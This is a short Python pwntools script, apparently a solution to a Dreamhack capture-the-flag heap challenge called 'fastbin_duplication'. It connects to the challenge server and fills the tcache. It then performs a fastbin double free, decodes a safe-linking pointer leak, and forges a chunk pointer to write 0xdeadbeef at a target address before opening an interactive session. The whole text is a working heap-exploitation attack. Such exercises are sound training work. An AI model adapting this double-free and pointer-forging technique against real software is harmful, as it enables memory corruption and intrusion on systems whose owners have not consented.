from pwn import *
#p = process('./fastbin_duplication')
p = remote('host3.dreamhack.games', 14450)
e= ELF('./fastbin_duplication')
p.recvuntil(b'target: ')
target = int(p.recvn(14).decode (), 16)
def allocate(idx, content):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'content: ', content)
def free(idx):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
def view(idx):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b': ', str(idx).encode()) 


#fill tcache bin
for _ in range(7):
    allocate(0, b'AAAA')
    free(0)


allocate(0, b'AAAA')
allocate(1, b'BBBB')

free(0)
free(1)
free(0)

view(1)
leak = p.recvline()[:-1]
leak = u64(leak + b"\x00" * (8 - len(leak)))
addr = leak ^ (leak >> 12) ^ (leak >> 24) ^ (leak >> 36)
fake_addr = (target - 0x10) ^ (addr >> 12)

allocate(0, p64 (fake_addr))
allocate(0, b"BBBBBBBB")
allocate(0, b"CCCCCCCC")
allocate(0, p64(0xdeadbeef))
p.sendlineafter(b">> ", "0")
p.interactive()